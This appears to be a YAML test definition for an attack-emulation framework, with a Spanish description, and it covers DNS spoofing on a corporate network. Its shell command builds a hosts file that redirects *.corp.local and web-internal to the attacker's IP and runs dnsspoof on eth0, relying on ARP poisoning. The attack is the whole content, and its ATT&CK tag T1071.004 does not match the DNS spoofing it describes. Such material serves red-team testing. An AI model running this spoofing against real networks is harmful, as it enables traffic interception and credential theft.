---
id: credential_access_dns_spoof
name: DNS Spoofing
description: >
  Redirige consultas DNS de la victima hacia el atacante.
  Requiere ARP poisoning activo. T1071.004.
tactic: credential-access
technique:
  attack_id: T1071.004
  name: DNS
platforms:
  linux:
    sh:
      command: |
        source /opt/mitm-scripts/targets.sh
        cat > /tmp/dns_hosts.conf << EOF
        $(hostname -I | awk '{print $1}')  *.corp.local
        $(hostname -I | awk '{print $1}')  web-internal
        EOF
        timeout 60 dnsspoof -i eth0 -f /tmp/dns_hosts.conf 2>/dev/null
cleanup:
  - rm -f /tmp/dns_hosts.conf
tags:
  - credential-access
  - T1071.004
  - MITM
